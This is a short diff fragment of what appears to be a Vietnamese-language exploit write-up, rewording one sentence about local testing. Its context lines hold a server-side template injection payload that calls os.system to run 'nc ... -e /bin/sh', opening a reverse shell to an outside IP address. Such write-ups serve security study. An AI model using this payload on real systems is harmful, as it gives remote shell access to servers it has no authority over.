@@ -43,7 +43,7 @@ Mình chạy ở máy local và phát hiện command vẫn được thực hiệ
 
 ### **Exploit:**
 
-Sau một test thì mình sử dụng:
+Sau khi test trên local thì mình quyết định sử dụng:
 
 ```
 test=${self.module.cache.util.os.system("nc 18.139.9.214 12320 -e /bin/sh")}
